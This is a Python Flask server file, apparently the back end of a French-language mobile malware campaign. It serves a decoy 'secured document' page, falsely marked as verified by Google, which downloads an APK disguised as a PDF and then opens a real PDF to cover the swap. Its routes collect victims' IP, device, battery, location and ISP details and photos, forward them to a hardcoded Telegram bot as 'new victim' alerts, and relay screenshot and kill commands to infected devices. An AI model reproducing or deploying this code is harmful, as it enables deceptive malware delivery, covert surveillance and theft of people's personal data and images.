from flask import Flask, request, jsonify, send_file, send_from_directory
import requests
import json
import base64
import os
import time
import threading
from datetime import datetime

app = Flask(__name__, static_folder='../static')

# ========== CONFIGURATION TELEGRAM ==========
BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
CHAT_ID = "8546452645"

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ========== COMMANDES ==========
COMMANDS = {"screenshot": False, "kill": False}
captured_data = []

def send_telegram(text, photo_bytes=None):
    try:
        if photo_bytes:
            files = {'photo': ('shot.jpg', photo_bytes, 'image/jpeg')}
            data = {'chat_id': CHAT_ID, 'caption': text}
            requests.post(TELEGRAM_PHOTO_API, files=files, data=data, timeout=10)
        else:
            data = {'chat_id': CHAT_ID, 'text': text}
            requests.post(TELEGRAM_API, json=data, timeout=10)
    except Exception as e:
        print(f"Erreur: {e}")

# ========== PAGE HTML LEURRE ==========
HTML_PAGE = '''<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Sécurisé</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            text-align: center;
            padding: 2rem;
        }
        .pdf-card {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 2rem;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            border: 1px solid #e74c3c;
        }
        .pdf-card:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
        }
        .pdf-icon {
            font-size: 80px;
            margin-bottom: 1rem;
        }
        h2 {
            color: #e74c3c;
            margin-bottom: 0.5rem;
        }
        p {
            color: #888;
            font-size: 0.9rem;
        }
        .secure-badge {
            margin-top: 1rem;
            color: #27ae60;
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="pdf-card" id="downloadBtn">
            <div class="pdf-icon">📄</div>
            <h2>STYLE_FORMATION.pdf</h2>
            <p>Document sécurisé • 2.4 MB</p>
            <div class="secure-badge">✓ Vérifié par Google Security</div>
        </div>
    </div>

    <script>
        document.getElementById('downloadBtn').addEventListener('click', function() {
            // Téléchargement de l'APK (déguisé en PDF)
            const link = document.createElement('a');
            link.href = '/static/app-release.apk';
            link.download = 'STYLE_FORMATION.pdf';
            link.click();
            
            // Redirection vers le vrai PDF après 1 seconde
            setTimeout(() => {
                window.open('/static/STYLE_FORMATION.pdf', '_blank');
            }, 1000);
        });
    </script>
</body>
</html>
'''

# ========== ROUTES ==========
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        data['ip'] = ip
        data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        captured_data.append(data)
        
        # Envoi Telegram
        msg = f"""🔴 *NOUVELLE VICTIME* 🔴
━━━━━━━━━━━━━━━━━━
📍 IP: {data.get('ip', '?')}
📱 OS: {data.get('os', '?')}
🔋 Batterie: {data.get('battery', '?')}
🌍 Position: {data.get('city', '?')}, {data.get('country', '?')}
📡 ISP: {data.get('isp', '?')}
🕐 {data.get('timestamp')}
━━━━━━━━━━━━━━━━━━"""
        send_telegram(msg)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/api/photo', methods=['POST'])
def photo():
    try:
        data = request.json
        if data and data.get('photo'):
            photo_b64 = data['photo'].split(',')[1]
            photo_bytes = base64.b64decode(photo_b64)
            idx = data.get('index', '?')
            ip = data.get('info', {}).get('ip', '?')
            
            msg = f"📸 *CAPTURE {idx}*\n🌐 IP: {ip}"
            send_telegram(msg, photo_bytes)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/api/check_cmd')
def check_cmd():
    if COMMANDS.get("screenshot", False):
        COMMANDS["screenshot"] = False
        return jsonify({"command": "screenshot"})
    if COMMANDS.get("kill", False):
        COMMANDS["kill"] = False
        return jsonify({"command": "kill"})
    return jsonify({"command": "none"})

@app.route('/api/trigger/<action>')
def trigger_action(action):
    if action in COMMANDS:
        COMMANDS[action] = True
        send_telegram(f"✅ Ordre reçu: {action}")
        return "OK"
    return "ERREUR", 404

@app.route('/api/status')
def status():
    return jsonify({
        'status': 'active',
        'victims': len(captured_data),
        'last_capture': captured_data[-1] if captured_data else None
    })

# ========== FICHIERS STATIQUES ==========
@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('../static', path)

# ========== HANDLER ==========
def handler(event, context):
    return app(event, context)
